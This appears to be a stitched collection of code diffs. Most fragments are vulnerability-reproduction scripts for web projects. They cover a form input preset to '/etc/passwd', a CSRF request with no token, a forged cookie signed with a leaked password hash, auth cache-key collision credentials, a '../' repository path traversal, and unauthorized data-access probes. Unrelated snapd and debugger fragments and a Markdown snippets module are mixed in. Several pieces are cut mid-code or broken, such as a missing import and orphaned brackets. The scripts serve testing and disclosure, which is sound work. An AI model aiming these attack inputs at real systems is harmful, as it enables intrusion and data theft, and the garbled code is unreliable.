@@ -0,0 +1,54 @@
+from mechanicalsoup import Browser
+import os
+import tempfile
+import bs4
+import urllib.parse
+
+def test_file_input_vulnerability():
+    # Create a temporary HTML file
+    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.html', dir='.') as f:
+        html_content = '''<html>
+<body>
+<form method="post" enctype="multipart/form-data">
+    <input type="file" name="file" value="/etc/passwd">
+    <input type="submit">
+</form>
+</body>
+</html>'''
+        f.write(html_content)
+        temp_filename = os.path.basename(f.name)
+        temp_path = os.path.abspath(f.name)
+
+    # Start a temporary HTTP server to serve the file
+    import http.server
+    import socketserver
+    import threading
+
+    PORT = 8080
+    Handler = http.server.SimpleHTTPRequestHandler
+    with socketserver.TCPServer(('', PORT), Handler) as httpd:
+        server_thread = threading.Thread(target=httpd.serve_forever)
+        server_thread.daemon = True
+        server_thread.start()
+
+        browser = Browser()
+        file_url = f'http://localhost:{PORT}/{temp_filename}'
+        page = browser.get(file_url)
+        form = page.soup.form
+
+        try:
+            # Submit the form while server is running
+            response = browser.submit(form, url=file_url)  # Use server's URL
+            # Check if malicious file path was sent
+            if hasattr(response.request, 'body') and b'/etc/passwd' in response.request.body:
+                print("Vulnerability reproduced: Attempted to read arbitrary file.")
+            else:
+                print("Vulnerability not reproduced: File input value was ignored.")
+        except FileNotFoundError:
+            print("Vulnerability reproduced: Attempted to read arbitrary file.")
+        finally:
+            os.unlink(temp_path)
+            httpd.shutdown()
+            server_thread.join()
+
+test_file_input_vulnerability()

+import os
+import django
+from django.test import Client
+from django.contrib.auth import get_user_model
+
+# Setup Django environment
+os.environ.setdefault("DJANGO_SETTINGS_MODULE", "wagtail.test.settings")
+django.setup()
+from django.core.management import call_command
+call_command('migrate')
+
+User = get_user_model()
+
+# Create test users
+admin_user = User.objects.create_superuser(username='admin', email='admin@example.com', password='password')
+limited_user = User.objects.create_user(
+    username='limited_editor', email='limited@example.com', password='password'
+)
+limited_user.is_staff = True
+limited_user.save()
+
+test_user = User.objects.create_user(
+    username='victim_user', email='victim@example.com', password='password',
+    first_name='Sensitive', last_name='Name'  # This display name should not be leaked
+)
+
+# Setup test client
+client = Client()
+client.login(username='limited_editor', password='password')
+
+# Attempt to access bulk action endpoint with target user ID
+response = client.get(f'/admin/users/bulk/delete/?user_ids={test_user.pk}')
+
+# Check if sensitive name appears in response
+if 'Sensitive Name' in response.content.decode():
+    print("VULNERABILITY DETECTED: User display name leaked")
+else:
+    print("VULNERABILITY FIXED: No sensitive name leaked")

+package main
+
+import (
+"io/ioutil"
+"net/http"
+"time"
+
+"github.com/gofiber/fiber/v2"
+"github.com/gofiber/fiber/v2/middleware/csrf"
+"github.com/gofiber/session/v2"
+"github.com/gofiber/storage/memory/v2"
+)
+
+func main() {
+app := fiber.New()
+
+// Setup in-memory session store (mimics real-world usage)
+store := session.New(session.Config{
+Provider: memory.New(),
+})
+defer store.Close()
+
+// Configure CSRF middleware with session storage (vulnerable code path)
+app.Use(csrf.New(csrf.Config{
+Session:    store,
+SessionKey: "csrf_token",
+Expiration: 1 * time.Hour,
+}))
+
+// Protected endpoint requiring valid CSRF token
+app.Post("/protected", func(c *fiber.Ctx) error {
+return c.SendString("Success")
+})
+
+// Simulate malicious CSRF request (no token provided)
+resp, err := http.Post("http://localhost:3000/protected", "application/x-www-form-urlencoded", nil)
+if err != nil {
+panic(err)
+}
+defer resp.Body.Close()
+
+body, _ := ioutil.ReadAll(resp.Body)
+
+// Check if request was improperly accepted (vulnerable) or rejected (fixed)
+if resp.StatusCode == http.StatusOK {
+println("VULNERABLE: Unauthorized request succeeded")
+} else {
+println("FIXED: Unauthorized request rejected (status:", resp.StatusCode, ", body:", string(body), ")")
+}
+}

+package main

+)
+
+func main() {
+app := fiber.New()
+
+// Configure CSRF middleware with storage (vulnerable code path)
+app.Use(csrf.New(csrf.Config{
+Storage:    memory.New(),
+SessionKey: "csrf_token",
+Expiration: 1 * time.Hour,
+}))
+
+// Protected endpoint
+app.Post("/protected", func(c *fiber.Ctx) error {
+return c.SendString("Success")
+})
+
+// Start server in background
+go func() {
+if err := app.Listen(":3000"); err != nil {
+panic(err)
+}
+}()
+
+// Wait for server to initialize
+time.Sleep(200 * time.Millisecond)
+
+// Simulate CSRF attack (no token)
+resp, err := http.Post("http://localhost:3000/protected", "application/x-www-form-urlencoded", nil)
+if err != nil {
+panic(err)
+}

+
+body, _ := io.ReadAll(resp.Body)
+
+// Check result

+println("VULNERABLE: Unauthorized request succeeded")
+} else {

+                // usually stripped out by ld.so when starting a

+        // 1) Services are implemented using systemd service units. Starting a
+        // unit automatically places it in a cgroup named after the service unit
+        // name. Snapd controls the name of the service units thus indirectly
+        // controls the cgroup name.
+        //
+        // 2) Non-services, including hooks, are started inside systemd

+        // programmatically and are meant for groups of processes started and
+        // stopped by an _arbitrary process_ (ie, not systemd). Systemd

+        // using tools like sudo are placed under system.slice. Programs running as

+                        }
+                        return err
+                }
+                return x.runCmdUnderGdbserver(cmd, envForExec)
+        } else if x.useStrace() {
+                return x.runCmdUnderStrace(cmd, envForExec)
+        } else {
+                return syscallExec(cmd[0], cmd, envForExec(nil))
+        }

+#!/bin/bash
+set -euo pipefail
+
+# Setup test environment
+kubectl create namespace argocd || true
+kubectl apply -f https://raw.githubusercontent.com/argoproj/argo-cd/v2.5.0/manifests/install.yaml
+
+# Wait for Argo CD to be ready
+kubectl wait --for=condition=available deployment/argocd-server -n argocd --timeout=300s
+kubectl wait --for=condition=available deployment/argocd-application-controller -n argocd --timeout=300s
+
+# Enable apps-in-any-namespace and set allowed namespaces to argocd-*
+kubectl patch configmap argocd-cmd-params-cm -n argocd --type merge -p '{"data": {"application.namespaces": "argocd-*"}}'
+
+# Enable sharding by scaling application controller to 2 replicas
+kubectl scale deployment argocd-application-controller -n argocd --replicas=2
+
+# Wait for controller to restart
+kubectl rollout status deployment/argocd-application-controller -n argocd --timeout=300s
+
+# Create test namespace outside allowed pattern
+kubectl create namespace other || true
+
+# Create test application in 'other' namespace
+cat <<EOF | kubectl apply -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+  name: test-app
+  namespace: argocd
+spec:
+  project: default
+  source:
+    repoURL: https://github.com/argoproj/argocd-example-apps.git
+    targetRevision: HEAD
+    path: guestbook
+  destination:
+    server: https://kubernetes.default.svc
+    namespace: other
+EOF
+
+# Wait for application to be processed (should NOT be processed if fix is correct)

+

+  echo "VULNERABILITY DETECTED: Application was reconciled in unauthorized namespace"
+  exit 1
+else
+  echo "Vulnerability not detected"
+  exit 0
+fi

+#!/bin/bash
+
+set -euo pipefail
+
+# Create temporary directory to isolate test environment
+temp_dir=$(mktemp -d)
+cd "$temp_dir"
+
+# Step 1: Generate bcrypt hash for valid password 'securepass'
+hash=$(go run - <<EOF
+package main
+import (
+"fmt"
+"golang.org/x/crypto/bcrypt"
+)
+func main() {
+password := []byte("securepass")
+cost := bcrypt.DefaultCost
+hash, err := bcrypt.GenerateFromPassword(password, cost)
+if err != nil {
+panic(err)
+}
+fmt.Println(string(hash))
+}
+EOF
+)
+
+# Step 2: Create temporary web.yml configuration
+cat > web.yml <<EOL
+users:
+  admin: "$hash"
+http_config:
+  header:
+    X-Test: "vulnerability-check"
+EOL
+
+# Step 3: Create minimal server using exporter-toolkit
+cat > main.go <<'EOL'
+package main
+
+func main() {}
+EOL
+
+# Step 4: Build and start server in background
+go mod init testserver
+GO111MODULE=on go mod edit -replace github.com/prometheus/exporter-toolkit=/workspace/exporter-toolkit
+GO111MODULE=on go get github.com/prometheus/exporter-toolkit # Use local modified version
+go build -o server main.go
+./server &
+SERVER_PID=$!
+
+sleep 2 # Wait for server to start
+
+# Step 5: Function to send request and check status
+check_auth() {
+local user=$1
+local pass=$2
+local expected_status=$3
+
+status=$(curl -s -o /dev/null -w "%%{http_code}" -u "$user:$pass" http://localhost:8080)
+if [ "$status" -ne "$expected_status" ]; then
+echo "❌ Failed: User $user with password $pass returned status $status (expected $expected_status)"
+return 1
+else
+echo "✅ Success: User $user with password $pass returned status $expected_status"
+return 0
+fi
+}
+
+# Step 6: Test valid authentication (should cache success)
+echo "Testing valid authentication..."
+check_auth "admin" "securepass" 200 || exit 1
+
+# Step 7: Test cache poisoning attempt (crafted credentials that would collide in vulnerable cache key)
+# Vulnerable cache key: user + hashedPassword + pass
+# Construct malicious user/pass that concatenates to same key as valid admin:securepass
+MALICIOUS_USER="admi"
+MALICIOUS_PASS="nsecurepass"
+
+# Original vulnerable code: cache key = admin + $hash + securepass
+# Malicious attempt: user=$MALICIOUS_USER, pass=$MALICIOUS_PASS, hashedPassword (from web.yml) would need to make:
+# $MALICIOUS_USER + $hash + $MALICIOUS_PASS == admin + $hash + securepass
+# Since $MALICIOUS_USER is 'admi' and $MALICIOUS_PASS is 'nsecurepass', combined they form 'adminsecurepass'
+
+# Step 8: Send malicious request
+echo "Testing cache poisoning attempt..."
+check_auth "$MALICIOUS_USER" "$MALICIOUS_PASS" 200 && {
+ echo "❌ Vulnerability confirmed: Cache poisoning succeeded"
+ kill $SERVER_PID
+ exit 1
+}
+
+# Step 9: Cleanup
+kill $SERVER_PID
+cd ..
+rm -rf "$temp_dir"
+echo "✅ Vulnerability not detected"

+
+# Function to check cookie vulnerability
+check_cookie_vulnerability() {
+    local password_hash=$1
+    local port=$2
+
+    # Generate timestamp
+    timestamp=$(date +%s)
+    value="$timestamp"
+
+    # Compute HMAC-SHA256 signature
+    signature=$(echo -n "$value" | openssl dgst -sha256 -hmac "$password_hash" | awk '{print $2}')
+    cookie_value="$value|$signature"
+
+    # Attempt to access protected page with the cookie
+    http_code=$(curl -s -o /dev/null -w "%{http_code}" -b "camp=$cookie_value" "http://localhost:$port/")
+
+    if [ "$http_code" -eq 200 ]; then
+        echo "Vulnerable: Cookie secret is using password hash"
+        return 0
+    else
+        echo "Not vulnerable: Cookie secret is secure"
+        return 1
+    fi
+}
+
+# Start the server in the background
+python /workspace/camp/server.py --require-login > /dev/null 2>&1 &
+SERVER_PID=$!
+PORT=8000
+
+# Wait for server to start with timeout
+MAX_WAIT=20
+WAIT=0
+while ! curl --head --silent --connect-timeout 1 "http://localhost:$PORT" > /dev/null; do
+    sleep 1
+    WAIT=$((WAIT+1))
+    if [ $WAIT -ge $MAX_WAIT ]; then
+        echo "Server did not start within $MAX_WAIT seconds"
+        kill -9 $SERVER_PID
+        exit 1
+    fi
+    echo "Waiting for server to start... ($WAIT/$MAX_WAIT)"
+done
+
+# Check if password.txt is accessible via static file
+static_http_code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/static/password.txt")
+
+# If password.txt is accessible, read the hash and check cookie vulnerability
+cookie_vulnerable=1

+    password_hash=$(curl -s "http://localhost:$PORT/static/password.txt" | tr -d '\n')
+    check_cookie_vulnerability "$password_hash" "$PORT"
+    cookie_vulnerable=$?
+fi
+
+# Stop the server
+kill $SERVER_PID
+
+# Determine overall result
+if [ "$static_http_code" -eq 200 ] || [ "$cookie_vulnerable" -eq 0 ]; then

+#!/bin/bash
+set -euo pipefail
+
+# Check if jq is installed
+if ! command -v jq &> /dev/null; then
+    echo "Error: jq is required but not installed. Please install jq manually and try again."
+    exit 1
+fi
+
+# Configuration
+SYNAPSE_URL="http://localhost:8008"
+ADMIN_USER="@admin:example.com"
+ADMIN_PASS="admin123"
+TEST_USER="@test:example.com"
+TEST_PASS="test123"
+GROUP_ID="+testgroup:example.com"
+ROOM_ID="!testroom:example.com"
+
+# Helper to get access token
+get_token() {
+  curl -s -X POST "$SYNAPSE_URL/_matrix/client/r0/login" \
+    -H "Content-Type: application/json" \
+    -d '{"type":"m.login.password","user":"'"$1"'","password":"'"$2"'"}' \
+  | jq -r '.access_token'
+}
+
+# 1. Create test users (admin action)
+ADMIN_TOKEN=$(get_token "$ADMIN_USER" "$ADMIN_PASS")
+TEST_TOKEN=$(get_token "$TEST_USER" "$TEST_PASS")
+
+# 2. Create group and add room (admin action)
+curl -s -X PUT "$SYNAPSE_URL/_matrix/client/r0/groups/$GROUP_ID/profile" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"Test Group"}'
+
+curl -s -X PUT "$SYNAPSE_URL/_matrix/client/r0/groups/$GROUP_ID/rooms/$ROOM_ID" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"is_public": true}'
+
+# 3. Attempt to access group rooms as non-member test user
+RESPONSE=$(curl -s -H "Authorization: Bearer $TEST_TOKEN" \
+  "$SYNAPSE_URL/_matrix/client/r0/groups/$GROUP_ID/rooms")
+
+# 4. Verify response is empty for non-members
+if echo "$RESPONSE" | grep -q "$ROOM_ID"; then
+  echo "[FAIL] Vulnerability present: Non-member accessed room info"
+  exit 1
+else
+  echo "[PASS] Vulnerability fixed: No room info exposed"
+  exit 0
+fi

diff --git a/reproduce_vuln.py b/reproduce_vuln.py
new file mode 100644
index 0000000..d2a0106
--- /dev/null
+++ b/reproduce_vuln.py
@@ -0,0 +1,63 @@
+import os
+from sqlalchemy import create_engine
+from sqlalchemy.orm import scoped_session, sessionmaker
+from rdiffweb.core.model import UserObject, RepoObject, SshKey, Base
+from rdiffweb.core.model._user import DuplicateSSHKeyError
+from sqlalchemy.exc import IntegrityError
+
+# Setup in-memory database for testing
+engine = create_engine('sqlite:///:memory:')
+session = scoped_session(sessionmaker(bind=engine))
+from sqlalchemy import event
+from rdiffweb.core.model import db_after_create
+event.remove(Base.metadata, 'after_create', db_after_create)
+Base.metadata.create_all(engine)
+Base.query = session.query_property()
+
+# Bind session to model classes
+UserObject.session = session
+RepoObject.session = session
+SshKey.session = session
+
+# Test 1: SSH Key Duplication Vulnerability
+def test_ssh_key_duplication():
+    # Create test users
+    user1 = UserObject.add(username='testuser1', password='password')
+    user2 = UserObject.add(username='testuser2', password='password')
+    session.commit()
+    # Generate a test SSH key
+    test_key = 'ssh-rsa  test@example.com'
+    # Add key to user1
+    user1.add_authorizedkey(test_key)
+    session.commit()
+    try:
+        # Attempt to add same key to user2 (should fail if fixed)
+        user2.add_authorizedkey(test_key)
+        print("Test 1 FAILED: Duplicate SSH key added successfully")
+    except DuplicateSSHKeyError:
+        print("Test 1 PASSED: Duplicate SSH key rejected")
+    except Exception as e:
+        print(f"Test 1 ERROR: {str(e)}")
+    finally:
+        # Cleanup
+        SshKey.query.filter_by(fingerprint=test_key).delete()
+        user1.delete()
+        user2.delete()
+
+# Test 2: Repopath Sanitization Vulnerability
+def test_repopath_sanitization():
+    user = UserObject(username='testuser', password='password').add()
+    # Attempt to create repo with '..' in path
+    repo = RepoObject(userid=user.userid, repopath='../unauthorized_repo').add()
+    # Check if repopath was sanitized
+    if repo.repopath == '':
+        print("Test 2 PASSED: Repopath with '..' was sanitized")
+    else:
+        print(f"Test 2 FAILED: Repopath remains '{repo.repopath}'")
+    # Cleanup
+    repo.delete()
+    user.delete()
+
+if __name__ == '__main__':
+    test_ssh_key_duplication()
+    test_repopath_sanitization()

+from markdown import Extension
+from markdown.preprocessors import Preprocessor
+import functools
+import urllib
+import re

+import os
+from . import util
+import textwrap
+
+MI = 1024 * 1024  # mebibyte (MiB)
+DEFAULT_URL_SIZE = MI * 32
+DEFAULT_URL_TIMEOUT = 10.0  # in seconds
+DEFAULT_URL_REQUEST_HEADERS = {}
+
+
+class SnippetMissingError(Exception):
+    """Snippet missing exception."""
+
+
+class SnippetPreprocessor(Preprocessor):
+    """Handle snippets in Markdown content."""
+
+    RE_ALL_SNIPPETS = re.compile(
+        r'''(?x)
+        ^(?P<space>[ \t]*)
+        (?P<escape>;*)
+        (?P<all>
+            (?P<inline_marker>-{1,}8<-{1,}[ \t]+)
+            (?P<snippet>(?:"(?:\\"|[^"\n\r])+?"|'(?:\\'|[^'\n\r])+?'))(?![ \t]) |
+            (?P<block_marker>-{1,}8<-{1,})(?![ \t])
+        )\r?$
+        '''
+    )
+
+    RE_SNIPPET = re.compile(
+        r'''(?x)
+        ^(?P<space>[ \t]*)
+        (?P<snippet>.*?)\r?$
+        '''
+    )
+
+    RE_SNIPPET_SECTION = re.compile(
+        r'''(?xi)
+        ^(?P<pre>.*?)
+        (?P<escape>;*)
+        (?P<inline_marker>-{1,}8<-{1,}[ \t]+)
+        (?P<section>\[[ \t]*(?P<type>start|end)[ \t]*:[ \t]*(?P<name>[a-z][-_0-9a-z]*)[ \t]*\])
+        (?P<post>.*?)$
+        '''
+    )
+
+    RE_SNIPPET_FILE = re.compile(r'(?i)(.*?)(?:(:[0-9]*)?(:[0-9]*)?|(:[a-z][-_0-9a-z]*)?)$')
+
+    def __init__(self, config, md):
+        """Initialize."""
+
+        base = config.get('base_path')
+        if isinstance(base, str):
+            base = [base]
+        self.base_path = [os.path.abspath(b) for b in base]
+        self.encoding = config.get('encoding')
+        self.check_paths = config.get('check_paths')
+        self.auto_append = config.get('auto_append')
+        self.url_download = config['url_download']
+        self.url_max_size = config['url_max_size']
+        self.url_timeout = config['url_timeout']
+        self.url_request_headers = config['url_request_headers']
+        self.dedent_subsections = config['dedent_subsections']
+        self.tab_length = md.tab_length
+        super(SnippetPreprocessor, self).__init__()
+
+    def extract_section(self, section, lines):
+        """Extract the specified section from the lines."""
+
+        new_lines = []
+        start = False
+        found = False
+        for l in lines:
+
+            # Found a snippet section marker with our specified name
+            m = self.RE_SNIPPET_SECTION.match(l)
+
+            # Handle escaped line
+            if m and start and m.group('escape'):
+                l = (
+                    m.group('pre') + m.group('escape').replace(';', '', 1) + m.group('inline_marker') +
+                    m.group('section') + m.group('post')
+                )
+
+            # Found a section we are looking for.
+            elif m is not None and m.group('name') == section:
+
+                # We found the start
+                if not start and m.group('type') == 'start':
+                    start = True
+                    found = True
+                    continue
+
+                # Ignore duplicate start
+                elif start and m.group('type') == 'start':
+                    continue
+
+                # We found the end
+                elif start and m.group('type') == 'end':
+                    start = False
+                    break
+
+                # We found an end, but no start
+                else:
+                    break
+
+            # Found a section we don't care about, so ignore it.
+            elif m and start:
+                continue
+
+            # We are currently in a section, so append the line
+            if start:
+                new_lines.append(l)
+
+        if not found and self.check_paths:
+            raise SnippetMissingError("Snippet section '{}' could not be located".format(section))
+
+        return self.dedent(new_lines) if self.dedent_subsections else new_lines
+
+    def dedent(self, lines):
+        """De-indent lines."""
+
+        return textwrap.dedent('\n'.join(lines)).split('\n')
+
+    def get_snippet_path(self, path):
+        """Get snippet path."""
+
+        snippet = None
+        for base in self.base_path:
+            if os.path.exists(base):
+                if os.path.isdir(base):
+                    filename = os.path.join(base, path)
+                    # Resolve absolute paths to check for directory traversal
+                    abs_base = os.path.abspath(base)
+                    abs_filename = os.path.abspath(filename)
+                    # Ensure the filename is within the base directory
+                    if not abs_filename.startswith(abs_base):
+                        continue  # Skip this candidate as it's outside the base
+                    if os.path.exists(abs_filename):
+                        snippet = abs_filename
+                        break
+                else:
+                    basename = os.path.basename(base)
+                    dirname = os.path.dirname(base)
+                    if basename.lower() == path.lower():
+                        filename = os.path.join(dirname, path)
+                        if os.path.exists(filename):
+                            snippet = filename
+                            break
+        return snippet
+
+    @functools.lru_cache()
+    def download(self, url):
+        """
+        Actually download the snippet pointed to by the passed URL.
+
+        The most recently used files are kept in a cache until the next reset.
+        """
+
+        http_request = urllib.request.Request(url, headers=self.url_request_headers)
+        timeout = None if self.url_timeout == 0 else self.url_timeout
+        with urllib.request.urlopen(http_request, timeout=timeout) as response:
+
+            # Fail if status is not OK
+            status = response.status if util.PY39 else response.code
+            if status != 200:
+                raise SnippetMissingError("Cannot download snippet '{}'".format(url))
+
+            # We provide some basic protection against absurdly large files.
+            # 32MB is chosen as an arbitrary upper limit. This can be raised if desired.
+            length = response.headers.get("content-length")
+            if length is None:
+                raise ValueError("Missing content-length header")
+            content_length = int(length)
+
+            if self.url_max_size != 0 and content_length >= self.url_max_size:
+                raise ValueError("refusing to read payloads larger than or equal to {}".format(self.url_max_size))
+
+            # Nothing to return
+            if content_length == 0:
+                return ['']
+
+            # Process lines
+            return [l.decode(self.encoding).rstrip('\r\n') for l in response.readlines()]
+
+    def parse_snippets(self, lines, file_name=None, is_url=False):
+        """Parse snippets snippet."""
+
+        if file_name:
+            # Track this file.
+            self.seen.add(file_name)
+
+        new_lines = []
+        inline = False
+        block = False
+        for line in lines:
+            # Check for snippets on line
+            inline = False
+            m = self.RE_ALL_SNIPPETS.match(line)
+            if m:
+                if m.group('escape'):
+                    # The snippet has been escaped, replace first `;` and continue.
+                    new_lines.append(line.replace(';', '', 1))
+                    continue
+
+                if block and m.group('inline_marker'):
+                    # Don't use inline notation directly under a block.
+                    # It's okay if inline is used again in sub file though.
+                    continue
+
+                elif m.group('inline_marker'):
+                    # Inline
+                    inline = True
+
+                else:
+                    # Block
+                    block = not block
+                    continue
+
+            elif not block:
+                # Not in snippet, and we didn't find an inline,
+                # so just a normal line
+                new_lines.append(line)
+                continue
+
+            if block and not inline:
+                # We are in a block and we didn't just find a nested inline
+                # So check if a block path
+                m = self.RE_SNIPPET.match(line)
+
+            if m:
+                # Get spaces and snippet path.  Remove quotes if inline.
+                space = m.group('space').expandtabs(self.tab_length)
+                path = m.group('snippet')[1:-1].strip() if inline else m.group('snippet').strip()
+
+                if not inline:
+                    # Block path handling
+                    if not path:
+                        # Empty path line, insert a blank line
+                        new_lines.append('')
+                        continue
+
+                # Ignore commented out lines
+                if path.startswith(';'):
+                    continue
+
+                # Get line numbers (if specified)
+                end = None
+                start = None
+                section = None
+                m = self.RE_SNIPPET_FILE.match(path)
+                path = m.group(1).strip()
+                # Looks like we have an empty file and only lines specified
+                if not path:
+                    if self.check_paths:
+                        raise SnippetMissingError("Snippet at path '{}' could not be found".format(path))
+                    else:
+                        continue
+                ending = m.group(3)
+                if ending and len(ending) > 1:
+                    end = int(ending[1:])
+                starting = m.group(2)
+                if starting and len(starting) > 1:
+                    start = max(1, int(starting[1:]) - 1)
+                section_name = m.group(4)
+                if section_name:
+                    section = section_name[1:]
+
+                # Ignore path links if we are in external, downloaded content
+                is_link = path.lower().startswith(('https://', 'http://'))
+                if is_url and not is_link:
+                    continue
+
+                # If this is a link, and we are allowing URLs, set `url` to true.
+                # Make sure we don't process `path` as a local file reference.
+                url = self.url_download and is_link
+                snippet = self.get_snippet_path(path) if not url else path
+
+                if snippet:
+
+                    # This is in the stack and we don't want an infinite loop!
+                    if snippet in self.seen:
+                        continue
+
+                    if not url:
+                        # Read file content
+                        with codecs.open(snippet, 'r', encoding=self.encoding) as f:
+                            s_lines = [l.rstrip('\r\n') for l in f]
+                            if start is not None or end is not None:
+                                s = slice(start, end)
+                                s_lines = self.dedent(s_lines[s]) if self.dedent_subsections else s_lines[s]
+                            elif section:
+                                s_lines = self.extract_section(section, s_lines)
+                    else:
+                        # Read URL content
+                        try:
+                            s_lines = self.download(snippet)
+                            if start is not None or end is not None:
+                                s = slice(start, end)
+                                s_lines = self.dedent(s_lines[s]) if self.dedent_subsections else s_lines[s]
+                            elif section:
+                                s_lines = self.extract_section(section, s_lines)
+                        except SnippetMissingError:
+                            if self.check_paths:
+                                raise
+                            s_lines = []
+
+                    # Process lines looking for more snippets
+                    new_lines.extend(
+                        [
+                            space + l2 for l2 in self.parse_snippets(
+                                s_lines,
+                                snippet,
+                                is_url=url
+                            )
+                        ]
+                    )
+
+                elif self.check_paths:
+                    raise SnippetMissingError("Snippet at path '{}' could not be found".format(path))
+
+        # Pop the current file name out of the cache
+        if file_name:
+            self.seen.remove(file_name)
+
+        return new_lines
+
+    def run(self, lines):
+        """Process snippets."""
+
+        self.seen = set()
+        if self.auto_append:
+            lines.extend("\n\n-8<-\n{}\n-8<-\n".format('\n\n'.join(self.auto_append)).split('\n'))
+
+        return self.parse_snippets(lines)
+
+
+class SnippetExtension(Extension):
+    """Snippet extension."""
+
+    def __init__(self, *args, **kwargs):
+        """Initialize."""
+
+        self.config = {
+            'base_path': [".", "Base path for snippet paths - Default: [\".\"]"],
+            'encoding': ["utf-8", "Encoding of snippets - Default: \"utf-8\""],
+            'check_paths': [False, "Make the build fail if a snippet can't be found - Default: \"False\""],
+            "auto_append": [
+                [],
+                "A list of snippets (relative to the 'base_path') to auto append to the Markdown content - Default: []"
+            ],
+            'url_download': [False, "Download external URLs as snippets - Default: \"False\""],
+            'url_max_size': [DEFAULT_URL_SIZE, "External URL max size (0 means no limit)- Default: 32 MiB"],
+            'url_timeout': [DEFAULT_URL_TIMEOUT, 'Defualt URL timeout (0 means no timeout) - Default: 10 sec'],
+            'url_request_headers': [DEFAULT_URL_REQUEST_HEADERS, "Extra request Headers - Default: {}"],
+            'dedent_subsections': [False, "Dedent subsection extractions e.g. 'sections' and/or 'lines'."]
+        }
+
+        super(SnippetExtension, self).__init__(*args, **kwargs)
+
+    def extendMarkdown(self, md):
+        """Register the extension."""
+
+        self.md = md
+        md.registerExtension(self)
+        config = self.getConfigs()
+        snippet = SnippetPreprocessor(config, md)
+        md.preprocessors.register(snippet, "snippet", 32)
+
+    def reset(self):
+        """Reset."""
+
+        self.md.preprocessors['snippet'].download.cache_clear()
+
+
+def makeExtension(*args, **kwargs):
+    """Return extension."""
+
+    return SnippetExtension(*args, **kwargs)

+# Reproduction script for CVE-2021-46561
+# Simulate organizational admin attempting to transfer user to another organization
+
+# Assuming base API URL

+
+# Admin credentials (org_shortname: 'original_org')
+ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." # Replace with valid admin token

+NEW_ORG="malicious_org" # Different from admin's organization
+

+  -H "Authorization: Bearer ${ADMIN_TOKEN}" \
+  -H "Content-Type: application/json" 2>&1)
+

+if [[ -z $STATUS_CODE ]]; then
